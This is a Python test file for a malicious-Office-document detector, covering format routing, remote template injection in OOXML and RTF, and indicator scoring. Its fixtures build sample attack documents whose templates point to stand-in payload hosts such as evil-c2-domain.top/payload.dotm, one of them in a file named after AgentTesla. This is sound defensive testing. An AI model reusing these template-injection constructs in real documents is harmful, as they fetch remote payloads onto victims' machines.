"""Tests for the Office document analysis package.

doc_analysis is six passes over three container formats, joined by a flat set
of indicator flags that the combo scoring engine reads. These tests work at
that seam: they drive individual passes with crafted containers and assert on
the flags, because the flags are the only thing that reaches the score.
"""

import zipfile

from modules.static.doc_analysis.routing import detect_format
from modules.static.doc_analysis.scoring import COMBO_RULES, score_document
from modules.static.doc_analysis.template_inject import (
    _extract_attr,
    analyse_openxml_rels,
    analyse_rtf_template,
)

_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    "<Relationship Id={q}rId1{q} "
    "Type={q}http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate{q} "
    "Target={q}http://evil-c2-domain.top/payload.dotm{q} TargetMode={q}External{q}/>"
    "</Relationships>"
)


def _docx(tmp_path, rels: str, name: str = "sample.docx"):
    """Build a minimal OOXML container carrying *rels*."""
    p = tmp_path / name
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/document.xml.rels", rels)
    return p


# ----------------------------------------------------------------------
# Format routing
# ----------------------------------------------------------------------

def test_rtf_behind_a_doc_extension_routes_as_rtf(tmp_path):
    """The disguise this module exists to see through."""
    p = tmp_path / "AgentTesla.doc"
    p.write_bytes(rb"{\rtf1\ansi{\*\template http://evil.tld/t.dotm}}")
    assert detect_format(p) == "rtf"


def test_ole_and_openxml_are_distinguished(tmp_path):
    ole = tmp_path / "a.doc"
    ole.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32)
    zipped = tmp_path / "b.docx"
    zipped.write_bytes(b"PK\x03\x04" + b"\x00" * 32)
    assert detect_format(ole) == "ole"
    assert detect_format(zipped) == "openxml"


# ----------------------------------------------------------------------
# Template injection — OOXML relationships
# ----------------------------------------------------------------------

def test_external_template_to_a_non_microsoft_host_is_flagged(tmp_path):
    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"')))
    assert "template_inject_high" in out["indicator_flags"]
    assert "template_inject_non_ms" in out["indicator_flags"]
    assert out["external_relationships"][0]["non_microsoft_url"] is True


def test_single_quoted_attributes_are_read(tmp_path):
    """XML permits either quote style; Word accepts both.

    Matching only double quotes meant a .rels written with single quotes
    produced no relationships at all — no target parsed, no external
    check, no flags — while Word still fetched the remote template.
    """
    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q="'")))
    assert "template_inject_high" in out["indicator_flags"]
    assert "template_inject_non_ms" in out["indicator_flags"]
    assert out["external_relationships"][0]["target"] == (
        "http://evil-c2-domain.top/payload.dotm"
    )


def test_both_quote_styles_agree(tmp_path):
    double = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"'), "d.docx"))
    single = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q="'"), "s.docx"))
    assert double["indicator_flags"] == single["indicator_flags"]
    assert double["external_relationships"] == single["external_relationships"]


def test_microsoft_hosted_template_is_not_flagged_as_external_host(tmp_path):
    rels = _RELS.format(q='"').replace(
        "http://evil-c2-domain.top/payload.dotm",
        "https://company.sharepoint.com/normal.dotm",
    )
    out = analyse_openxml_rels(_docx(tmp_path, rels))
    assert "template_inject_non_ms" not in out["indicator_flags"]


def test_attribute_extraction_handles_either_quote_style():
    tag = "<Relationship Target='http://a.tld/x' Type=\"http://b/type\"/>"
    assert _extract_attr(tag, "Target") == "http://a.tld/x"
    assert _extract_attr(tag, "Type") == "http://b/type"


def test_attribute_names_are_matched_case_insensitively():
    """Read at least as permissively as the application being protected.

    The pre-existing TargetMode test was a case-folded substring search, so
    narrowing to a case-sensitive attribute match would have been a free
    evasion if any Office version ever accepted the variant casing.
    """
    tag = "<Relationship TARGET='http://a.tld/x' targetmode='External'/>"
    assert _extract_attr(tag, "Target") == "http://a.tld/x"
    assert _extract_attr(tag, "TargetMode") == "External"


def test_target_does_not_match_targetmode():
    tag = "<Relationship TargetMode=\"External\"/>"
    assert _extract_attr(tag, "Target") == ""


def test_missing_attribute_yields_empty_string():
    assert _extract_attr("<Relationship Id='rId1'/>", "Target") == ""


# ----------------------------------------------------------------------
# Template injection — RTF
# ----------------------------------------------------------------------

def test_remote_rtf_template_is_flagged():
    out = analyse_rtf_template(rb"{\rtf1{\*\template http://evil.tld/t.dotm}}")
    assert out["templates"][0]["remote"] is True
    assert "template_inject_non_ms" in out["indicator_flags"]


def test_local_rtf_template_is_recorded_but_not_flagged():
    """A local template target is how the feature legitimately works."""
    out = analyse_rtf_template(rb"{\rtf1{\*\template C:\\Normal.dotm}}")
    assert out["templates"]
    assert out["indicator_flags"] == set()


# ----------------------------------------------------------------------
# Scoring engine
# ----------------------------------------------------------------------

def test_combination_outscores_its_parts():
    """The engine prices delivery, not just artefacts."""
    alone, _, _ = score_document({"auto_exec"})
    combo, _, _ = score_document({"auto_exec", "shell_keyword"})
    assert combo > alone


def test_classification_bands():
    assert score_document(set())[2] == "CLEAN"
    assert score_document({"malformed_openxml"})[2] == "INFORMATIONAL"
    assert score_document({"altchunk"})[2] == "SUSPICIOUS"
    assert score_document({"auto_exec", "shell_keyword"})[2] == "MALICIOUS"


def test_unknown_flags_are_ignored():
    assert score_document({"not_a_real_flag"}) == (0, [], "CLEAN")


def test_score_is_capped_but_classification_is_not():
    everything = set().union(*(rule[0] for rule in COMBO_RULES))
    delta, _, classification = score_document(everything)
    assert delta == 60
    assert classification == "MALICIOUS"
